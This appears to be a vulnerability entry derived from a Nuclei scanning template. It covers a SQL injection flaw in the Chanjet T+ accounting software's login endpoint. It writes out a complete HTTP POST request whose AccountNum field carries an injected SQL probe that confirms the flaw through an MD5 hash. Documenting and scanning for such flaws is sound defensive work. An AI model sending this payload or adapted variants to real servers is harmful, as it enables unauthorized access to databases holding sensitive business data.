# Vulnerability: Chanjet TPluse Ufida.T.SM.Login.UIP - SQL injection
**Classification:** CWE-89
**Source:** Nuclei Template (`chanjet-tplus-ufida-sqli.yaml`)

## Description
Chanjet TPluse application has a SQL injection vulnerability, which can be used by attackers to obtain sensitive information in the database.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

{"AccountNum":"123 or 8767 IN (SELECT (sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1'))))","UserName":"admin","Password":"e10adc3949ba59abbe56e057f20f883e","rdpYear":"2021","rdpMonth":"12","rdpDate":"9","webServiceProcessID":"admin","ali_csessionid":"","ali_sig":"","ali_token":"","ali_scene":"","role":"","aqdKey":"","fromWhere":"browser","cardNo":""}
```

